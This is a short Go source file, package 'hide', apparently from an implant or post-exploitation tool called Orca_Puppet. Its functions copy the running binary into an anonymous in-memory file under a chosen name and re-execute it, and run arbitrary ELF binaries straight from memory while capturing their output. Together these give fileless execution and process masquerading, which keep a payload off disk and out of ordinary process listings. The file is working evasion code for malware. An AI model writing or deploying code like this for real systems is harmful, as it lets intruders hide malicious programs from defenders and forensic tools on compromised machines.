package hide

import (
	"Orca_Puppet/pkg/memfds"
	"Orca_Puppet/tools/util"
	"fmt"
	"io/ioutil"
	"os"
)

func Hide(name string) {
	memfd := memfds.New(name)
	memfd.Write(ReadMySelf())
	memfd.Execute(os.Args[1:])
}

func HideShell(elf []byte, args []string) (string, string) {
	var stdOut, stdErr string
	memfd := memfds.New("hide")
	memfd.Write(elf)
	stdOut, err := memfd.Cmd(args)
	if err != nil {
		stdErr = fmt.Sprintf("%s", err.Error())
		return "", stdErr
	}
	return stdOut, stdErr
}

func HideExec(elf []byte, args []string, hideName string) (int, uintptr, error) {
	memfd := memfds.New(hideName)
	_, err := memfd.Write(elf)
	if err != nil {
		return 0, 0, err
	}
	return memfd.Execute(args)
}

func ReadMySelf() []byte {
	path, _ := util.GetExecPathEx()
	f, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println("read fail", err)
	}
	return f
}
